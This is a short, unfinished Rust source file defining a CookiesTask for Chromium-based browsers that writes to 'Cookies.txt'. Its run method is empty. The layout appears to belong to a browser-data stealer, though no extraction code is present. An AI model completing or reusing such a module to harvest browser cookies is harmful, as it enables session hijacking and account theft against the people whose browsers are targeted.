use alloc::sync::Arc;
use alloc::vec::Vec;
use tasks::{parent_name, Task};
use utils::path::Path;
use crate::chromium::{Browser, ChromiumBasedBrowser};

pub(super) struct CookiesTask<'a> {
    browser: &'a Browser
}

impl<'a> CookiesTask {
    pub(super) fn new(browser: &'a Browser) -> Self {
        Self { browser }
    }
}

impl Task for CookiesTask {
    parent_name!("Cookies.txt");

    unsafe fn run(&self, parent: &Path) {

    }
}

